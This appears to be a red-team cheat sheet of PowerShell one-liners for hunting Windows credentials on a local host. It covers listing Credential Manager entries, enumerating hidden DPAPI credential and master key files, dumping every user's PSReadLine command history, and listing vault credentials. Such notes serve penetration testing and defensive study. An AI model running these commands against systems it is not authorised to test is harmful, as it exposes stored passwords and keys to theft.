# pwsh

#plateform/windows #target/local #cat/CREDENTIAL-ACCESS/CREDS_HUNT #tag/powershell 


## credential manager - list saved credentials
```powershell
cmdkey /list
```

## DPAPI - list credentials files
```powershell
Get-ChildItem -Hidden C:\Users\<user>\AppData\Local\Microsoft\Credentials\ ; Get-ChildItem -Hidden C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
```
## DPAPI - list master keys files
```powershell
Get-ChildItem -Hidden C:\Users\<user>\AppData\Local\Microsoft\Protect\<user_SID> ; Get-ChildItem -Hidden C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<user_SID>
```

## PSReadLine
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## vaultcmd - 
```powershell
vaultcmd /listcreds:"Windows Credentials" /all
```